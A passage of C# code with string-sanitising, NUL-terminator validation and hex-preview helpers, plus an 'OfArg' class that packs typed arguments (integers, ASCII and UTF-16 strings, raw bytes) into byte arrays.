			for (int i = 0; i < s.Length; i++)
			{
				char ch = s[i];
				// drop control chars (NUL/CR/LF/TAB, etc.)
				if (!char.IsControl(ch)) sb.Append(ch);
			}
			return sb.ToString().Trim();
		}

		private static string KeepPrintableAscii(string s)
		{
			if (string.IsNullOrEmpty(s)) return string.Empty;
			var sb = new StringBuilder(s.Length);
			for (int i = 0; i < s.Length; i++)
			{
				char ch = s[i];
				if (ch >= 0x20 && ch <= 0x7E) sb.Append(ch); // space..tilde
			}
			return sb.ToString();
		}

		static void ValidateForType(object argType, byte[] data)
		{
			if (IsAsciiZStringType(argType))
			{
				if (data == null || data.Length == 0 || data[data.Length - 1] != 0x00)
					throw new ArgumentException("ASCII Z-string missing NUL terminator");

				for (int i = 0; i < data.Length - 1; i++)
				{
					byte b = data[i];
					if (b < 0x20 && b != 0x09 && b != 0x0A)
						throw new ArgumentException("ASCII Z-string contains control 0x" + b.ToString("X2") + " at " + i);
				}
			}
			else if (IsUtf16ZStringType(argType))
			{
				if (data == null || data.Length < 2 || data[data.Length - 2] != 0x00 || data[data.Length - 1] != 0x00)
					throw new ArgumentException("UTF-16LE Z-string missing 2-byte NUL terminator");

				if ((data.Length & 1) != 0)
					throw new ArgumentException("UTF-16LE string length must be even");
			}
		}

		private static string HexPreview(byte[] data, int maxBytes)
		{
			if (data == null) return "<null>";
			int n = Math.Min(maxBytes, data.Length);
			var sb = new StringBuilder(n * 2);
			for (int i = 0; i < n; i++) sb.Append(data[i].ToString("X2"));
			if (data.Length > n) sb.Append(" …");
			return sb.Length == 0 ? "<empty>" : sb.ToString();
		}

		private string ExtractArg(string[] args, string key)
		{
			if (!args.Contains(key)) throw new Exception($"Args array does not contains key {key}");
			if (args.Count() > Array.IndexOf(args, key))
			{
				return args[Array.IndexOf(args, key) + 1];
			}
			else
			{
				throw new Exception($"Key {key} does not have a value");
			}

		}
	}

	class OfArg
	{

		public enum ArgType: UInt32
		{
			BINARY,
			INT32,
			INT16,
			STR,
			WCHR_STR,

		}

		public byte[] arg_data;

		public ArgType arg_type;
		public OfArg(UInt32 arg_data)
		{
			arg_type = ArgType.INT32;
			this.arg_data = BitConverter.GetBytes(arg_data);
		}

		public OfArg(UInt16 arg_data)
		{
			arg_type = ArgType.INT16;
			this.arg_data = BitConverter.GetBytes(arg_data);

		}

		public OfArg(ArgType type, byte[] data)
		{
    		arg_type = type;
    		arg_data = data ?? Array.Empty<byte>();
		}

		public OfArg(string arg_data)
		{
    		//arg_type = ArgType.BINARY;
    		arg_type = ArgType.STR;
    		this.arg_data = Encoding.ASCII.GetBytes(arg_data+"\0");
		}

		public static OfArg FromWString(string s)
		{
    		return new OfArg(ArgType.WCHR_STR, Encoding.Unicode.GetBytes((s ?? string.Empty) + "\0"));
		}



		public OfArg(byte[] arg_data)
		{ 
			arg_type = ArgType.BINARY;
			this.arg_data = arg_data;
		}
   
	}

}
"""

